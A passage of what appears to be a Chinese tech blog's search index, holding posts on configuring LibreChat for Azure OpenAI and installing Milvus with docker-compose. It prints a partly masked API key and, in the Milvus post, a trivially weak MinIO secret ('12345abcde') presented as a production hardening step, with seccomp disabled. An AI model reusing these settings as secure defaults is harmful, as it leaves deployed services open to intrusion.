765,U+677E,U+677F,U+6790,U+679C,U+67D0,U+67E5,U+6807,U+6837-6839,U+683C,U+6848,U+6863,U+68AD,U+68C0,U+6A21,U+6B21,U+6B4C,U+6B62,U+6B63,U+6B65,U+6B7B,U+6BB5,U+6BCF,U+6BD4,U+6C42,U+6C89,U+6CA1,U+6CD5,U+6CE8,U+6D3B,U+6D4B,U+6D88,U+6DFB,U+6E05,U+6E90,U+6EE5,U+6F0F,U+706B,U+70B9,U+70C2,U+70E6,U+7130,U+7136,U+7167,U+719F,U+723D,U+7248,U+7279,U+72B6,U+72EC,U+73A9,U+73AF,U+73B0,U+7406,U+751F,U+7528,U+7531,U+754C,U+7591,U+7684,U+76D6,U+76EE,U+76F4,U+76F8,U+7701,U+770B,U+771F,U+77E5,U+77ED,U+7801,U+7814,U+786E,U+793A,U+79BB,U+79CD,U+79D2,U+79DF,U+79F0,U+79FB,U+7A00,U+7A0B,U+7A76,U+7A7A,U+7ACB,U+7AD9,U+7ADE-7AE0,U+7AEF,U+7B2C,U+7B49,U+7B54,U+7B7E,U+7B80,U+7B97,U+7BA1,U+7C7B,U+7CFB,U+7D22,U+7E41,U+7EA7,U+7EAF,U+7EC6,U+7ECF,U+7ED3,U+7ED9,U+7EDC,U+7EDF,U+7EED,U+7F3A,U+7F51,U+7F6E,U+7F72,U+7FA4,U+8003,U+8005,U+800C,U+800D,U+8017,U+804C,U+8054,U+80AF,U+80CC,U+80FD,U+8106,U+8111,U+811A,U+817E,U+81EA,U+81F4,U+8272,U+8282,U+8350,U+83B7,U+83DC,U+85CF,U+8651,U+865A,U+884C,U+88AB,U+88C2,U+88C5,U+88D5,U+897F,U+8981,U+8986,U+89C9,U+89D2,U+89E3,U+8A00,U+8B66,U+8BA1,U+8BA2,U+8BAF,U+8BB2,U+8BBA,U+8BBE,U+8BBF,U+8BC1,U+8BD5,U+8BDD,U+8BE2,U+8BE5,U+8BE6,U+8BED,U+8BEF,U+8BF4,U+8BF7,U+8C03,U+8C37,U+8C61,U+8D25,U+8D44,U+8D70,U+8D77,U+8DD1,U+8DDF,U+8DEF,U+8DF3,U+8DF5,U+8F7B,U+8F7D,U+8F83,U+8F93,U+8FC1,U+8FC7,U+8FD0,U+8FD4,U+8FD8,U+8FD9,U+8FDB,U+8FDE,U+9000-9002,U+9009,U+901A,U+903C,U+9047,U+904D,U+9053,U+9075,U+90A3,U+90E8,U+90FD,U+914D,U+91CA,U+91CC,U+91CD,U+91CF,U+94FE,U+9501,U+9519,U+952E,U+955C,U+957F,U+95EE,U+95F4,U+9632,U+963B,U+9645,U+964B,U+9650,U+9664,U+968F,U+9690,U+969C,U+96BE,U+96C6,U+9700,U+975E,U+9762,U+9875,U+9876,U+987B,U+9884,U+9891,U+9898,U+9996,U+9AA4,U+9AD8,U+9EBB,U+FF01,U+FF0C,U+FF1A,U+FF1F\u003cspan class=\"p\"\u003e;\u003c/span\u003e       \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  font-style: normal\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  font-display: swap\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  font-weight: \u003cspan class=\"m\"\u003e300\u003c/span\u003e 700\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e把压缩后的字体和CSS再次提交后博客的速度就变得飞快了。\u003c/p\u003e","title":"Ai时代的Blog换脸与字体压缩"},{"content":"Ai的时代已经来临，现在主用的是谷歌的antigravity，然后平时对话询问，用的是LibreChat，给个链接\nhttps://github.com/danny-avila/LibreChat\n然后这个东西吧，配起来没那么简单，还是 docker compose 的部署方法快捷\n那有openrouter的api，这个接入简单。那同时之前还有用Azure gpt-4o的api，用的是Javis，直接接入Azure\nJavis偏弱，现在想统一用到LibreChat，接入还真的是一言难尽\n来详细说说Azure的配法，背景：Azure是同事在2024年开的，只给了我三个参数\nAZURE_OPENAI_API_BASE=\u0026#34;https://pppqqq-eus.openai.azure.com/\u0026#34; OPENAI_API_KEY=\u0026#34;12xxxaaabbbccccccccccccgggggggggggggggggggggggggggCOGuy6M\u0026#34; AZURE_OPENAI_DEPLOYMENT_NAME=\u0026#34;gpt-4o-abc\u0026#34; 然后呢，同事还离职了，然后其它参数就都问不到了\nLibreChat呢，文档简直稀烂，而且变动还特别大\nLibreChat主要的思路呢，就是在.env中定义变量，然后在librechat.yaml中使用变量，我们就省了，都扔到librechat.yaml中好了\nendpoints: azureOpenAI: titleModel: \u0026#34;gpt-4o\u0026#34; plugins: true groups: - group: \u0026#34;azure\u0026#34; apiKey: \u0026#34;12xxxaaabbbccccccccccccgggggggggggggggggggggggggggCOGuy6M\u0026#34; instanceName: \u0026#34;pppqqq-eus\u0026#34; version: \u0026#34;2024-05-01-preview\u0026#34; # 推荐使用新版API，以支持GPT-4o # --- Model-Level Mapping (重点) --- models: # LibreChat显示的名称: 实际Azure部署的名称 gpt-4o: # \u0026lt;--- 这个名称会显示在LibreChat的下拉菜单中 deploymentName: \u0026#34;gpt-4o-abc\u0026#34; # \u0026lt;--- 您的实际Azure部署名称 version: \u0026#34;2024-05-01-preview\u0026#34; # 可覆盖group的version gpt-4-turbo-2024-04-09: # LibreChat显示的名称 deploymentName: \u0026#34;gpt-4o-abc\u0026#34; # 您的实际Azure部署名称 version: \u0026#34;2024-02-15-preview\u0026#34; 上面的配置是问了gemini给出的，看得出来变量AZURE_OPENAI_API_BASE中的xxx.openai.azure.com前面的xxx，就是instanceName\nOPENAI_API_KEY就是apiKey\nAZURE_OPENAI_DEPLOYMENT_NAME就是deploymentName\n模型的gpt-4o还有gpt-4-turbo-2024-04-09都是geimini给出的，version也很重要，不对会报错\n然后就可以了\n不得不说，还是openroute的模型多啊，可惜就是太费钱了。Token哗哗飞，动辄都是65535Token\n","permalink":"https://rendoumi.com/posts/20251210-librechat_azure/","summary":"\u003cp\u003eAi的时代已经来临，现在主用的是谷歌的antigravity，然后平时对话询问，用的是LibreChat，给个链接\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/danny-avila/LibreChat\"\u003ehttps://github.com/danny-avila/LibreChat\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e然后这个东西吧，配起来没那么简单，还是 docker compose 的部署方法快捷\u003c/p\u003e\n\u003cp\u003e那有openrouter的api，这个接入简单。那同时之前还有用Azure gpt-4o的api，用的是Javis，直接接入Azure\u003c/p\u003e\n\u003cp\u003eJavis偏弱，现在想统一用到LibreChat，接入还真的是一言难尽\u003c/p\u003e\n\u003cp\u003e来详细说说Azure的配法，背景：Azure是同事在2024年开的，只给了我三个参数\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAZURE_OPENAI_API_BASE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://pppqqq-eus.openai.azure.com/\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eOPENAI_API_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;12xxxaaabbbccccccccccccgggggggggggggggggggggggggggCOGuy6M\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAZURE_OPENAI_DEPLOYMENT_NAME\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;gpt-4o-abc\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后呢，同事还离职了，然后其它参数就都问不到了\u003c/p\u003e\n\u003cp\u003eLibreChat呢，文档简直稀烂，而且变动还特别大\u003c/p\u003e\n\u003cp\u003eLibreChat主要的思路呢，就是在.env中定义变量，然后在librechat.yaml中使用变量，我们就省了，都扔到librechat.yaml中好了\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eendpoints:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  azureOpenAI:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    titleModel: \u003cspan class=\"s2\"\u003e\u0026#34;gpt-4o\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    plugins: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    groups:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - group: \u003cspan class=\"s2\"\u003e\u0026#34;azure\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        apiKey: \u003cspan class=\"s2\"\u003e\u0026#34;12xxxaaabbbccccccccccccgggggggggggggggggggggggggggCOGuy6M\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        instanceName: \u003cspan class=\"s2\"\u003e\u0026#34;pppqqq-eus\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        version: \u003cspan class=\"s2\"\u003e\u0026#34;2024-05-01-preview\u0026#34;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 推荐使用新版API，以支持GPT-4o\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# --- Model-Level Mapping (重点) ---\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        models:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"c1\"\u003e# LibreChat显示的名称: 实际Azure部署的名称\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          gpt-4o: \u003cspan class=\"c1\"\u003e# \u0026lt;--- 这个名称会显示在LibreChat的下拉菜单中\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            deploymentName: \u003cspan class=\"s2\"\u003e\u0026#34;gpt-4o-abc\u0026#34;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# \u0026lt;--- 您的实际Azure部署名称\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            version: \u003cspan class=\"s2\"\u003e\u0026#34;2024-05-01-preview\u0026#34;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 可覆盖group的version\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          gpt-4-turbo-2024-04-09: \u003cspan class=\"c1\"\u003e# LibreChat显示的名称\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            deploymentName: \u003cspan class=\"s2\"\u003e\u0026#34;gpt-4o-abc\u0026#34;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 您的实际Azure部署名称\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            version: \u003cspan class=\"s2\"\u003e\u0026#34;2024-02-15-preview\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上面的配置是问了gemini给出的，看得出来变量AZURE_OPENAI_API_BASE中的xxx.openai.azure.com前面的xxx，就是instanceName\u003c/p\u003e\n\u003cp\u003eOPENAI_API_KEY就是apiKey\u003c/p\u003e\n\u003cp\u003eAZURE_OPENAI_DEPLOYMENT_NAME就是deploymentName\u003c/p\u003e\n\u003cp\u003e模型的gpt-4o还有gpt-4-turbo-2024-04-09都是geimini给出的，version也很重要，不对会报错\u003c/p\u003e\n\u003cp\u003e然后就可以了\u003c/p\u003e","title":"LibreChat如何配置接入Azure"},{"content":"Milvus 是个向量数据库，可以在kubernetes里搭建，也可以独立出来搭建\nhelm的方式先不说，用docker-compose独立搭建的时候，居然自己跑了etcd和minio，还大摇大摆的把minio给暴漏了出来，minio的密码太简陋了，放在生产是肯定不行的。\n那生产搭建的具体步骤如下，可以把minio的9091端口也给取消了：\n一、准备好docker-compose.yml文件\nservices: etcd: container_name: milvus-etcd image: quay.io/coreos/etcd:v3.5.18 environment: - ETCD_AUTO_COMPACTION_MODE=revision - ETCD_AUTO_COMPACTION_RETENTION=1000 - ETCD_QUOTA_BACKEND_BYTES=4294967296 - ETCD_SNAPSHOT_COUNT=50000 volumes: - ${DOCKER_VOLUME_DIRECTORY:-.}/volumes/etcd:/etcd command: etcd -advertise-client-urls=http://etcd:2379 -listen-client-urls http://0.0.0.0:2379 --data-dir /etcd restart: unless-stopped healthcheck: test: [\u0026#34;CMD\u0026#34;, \u0026#34;etcdctl\u0026#34;, \u0026#34;endpoint\u0026#34;, \u0026#34;health\u0026#34;] interval: 30s timeout: 20s retries: 3 minio: container_name: milvus-minio image: minio/minio:RELEASE.2024-12-18T13-15-44Z environment: MINIO_ACCESS_KEY: rendoumi MINIO_SECRET_KEY: 12345abcde volumes: - ${DOCKER_VOLUME_DIRECTORY:-.}/volumes/minio:/minio_data command: minio server /minio_data --console-address \u0026#34;:9001\u0026#34; restart: unless-stopped healthcheck: test: [\u0026#34;CMD\u0026#34;, \u0026#34;curl\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;http://localhost:9000/minio/health/live\u0026#34;] interval: 30s timeout: 20s retries: 3 standalone: container_name: milvus-standalone image: milvusdb/milvus:v2.6.0 command: [\u0026#34;milvus\u0026#34;, \u0026#34;run\u0026#34;, \u0026#34;standalone\u0026#34;] restart: unless-stopped security_opt: - seccomp:unconfined environment: ETCD_ENDPOINTS: etcd:2379 MINIO_ADDRESS: minio:9000 MQ_TYPE: woodpecker volumes: - ${DOCKER_VOLUME_DIRECTORY:-.}/volumes/milvus:/var/lib/milvus healthcheck: test: [\u0026#34;CMD\u0026#34;, \u0026#34;curl\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;http://localhost:9091/healthz\u0026#34;] interval: 30s start_period: 90s timeout: 20s retries: 3 ports: - \u0026#34;19530:19530\u0026#34; depends_on: - \u0026#34;etcd\u0026#34; - \u0026#34;minio\u0026#34; networks: default: name: milvus 注意上面的文件，MINIO_ACCESS_KEY和MINIO_SECRET_KEY已经被改掉了。\n二、替换不安全的文件\n如上，运行 docker compose up -d，就会启动，但是这会儿milvus启动是报错的，因为minio的缺省密码变了，没法正确连接上。\n我们首先把配置文件拷贝出来\ndocker cp milvus-standalone:/milvus/configs/milvus.yaml milvus.yaml 修改minio部分中的ID和Key\n然后修改 docker-compose.yml ，把文件再挂进去\n最后运行：\ndocker compose up -d 就可以了\n最后的最后运行个ATTU进行管理吧：\ndocker run -d --name attu -p 8000:3000 -e ATTU_LOG_LEVEL=info -e MILVUS_URL=192.168.1.100:19530 zilliz/attu:v2.6 ","permalink":"https://rendoumi.com/posts/20251203-milvus_install/","summary":"\u003cp\u003eMilvus 是个向量数据库，可以在kubernetes里搭建，也可以独立出来搭建\u003c/p\u003e\n\u003cp\u003ehelm的方式先不说，用docker-compose独立搭建的时候，居然自己跑了etcd和minio，还大摇大摆的把minio给暴漏了出来，minio的密码太简陋了，放在生产是肯定不行的。\u003c/p\u003e\n\u003cp\u003e那生产搭建的具体步骤如下，可以把minio的9091端口也给取消了：\u003c/p\u003e\n\u003cp\u003e一、准备好docker-compose.yml文件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  etcd:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: milvus-etcd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: quay.io/coreos/etcd:v3.5.18\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"nv\"\u003eETCD_AUTO_COMPACTION_MODE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003erevision\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"nv\"\u003eETCD_AUTO_COMPACTION_RETENTION\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"nv\"\u003eETCD_QUOTA_BACKEND_BYTES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4294967296\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"nv\"\u003eETCD_SNAPSHOT_COUNT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e50000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOCKER_VOLUME_DIRECTORY\u003c/span\u003e\u003cspan class=\"k\"\u003e:-\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e/volumes/etcd:/etcd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: etcd -advertise-client-urls\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://etcd:2379 -listen-client-urls http://0.0.0.0:2379 --data-dir /etcd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    restart: unless-stopped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    healthcheck:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      test: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;CMD\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;etcdctl\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;endpoint\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;health\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      interval: 30s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      timeout: 20s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      retries: \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  minio:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: milvus-minio\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: minio/minio:RELEASE.2024-12-18T13-15-44Z\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      MINIO_ACCESS_KEY: rendoumi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      MINIO_SECRET_KEY: 12345abcde\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOCKER_VOLUME_DIRECTORY\u003c/span\u003e\u003cspan class=\"k\"\u003e:-\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e/volumes/minio:/minio_data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: minio server /minio_data --console-address \u003cspan class=\"s2\"\u003e\u0026#34;:9001\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    restart: unless-stopped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    healthcheck:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      test: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;CMD\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;curl\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;-f\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;http://localhost:9000/minio/health/live\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      interval: 30s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      timeout: 20s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      retries: \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  standalone:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: milvus-standalone\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: milvusdb/milvus:v2.6.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;milvus\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;run\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;standalone\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    restart: unless-stopped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    security_opt:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    - seccomp:unconfined\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      ETCD_ENDPOINTS: etcd:2379\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      MINIO_ADDRESS: minio:9000\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      MQ_TYPE: woodpecker\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOCKER_VOLUME_DIRECTORY\u003c/span\u003e\u003cspan class=\"k\"\u003e:-\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e/volumes/milvus:/var/lib/milvus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    healthcheck:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      test: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;CMD\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;curl\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;-f\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;http://localhost:9091/healthz\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      interval: 30s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      start_period: 90s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      timeout: 20s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      retries: \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;19530:19530\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    depends_on:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;etcd\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;minio\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetworks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  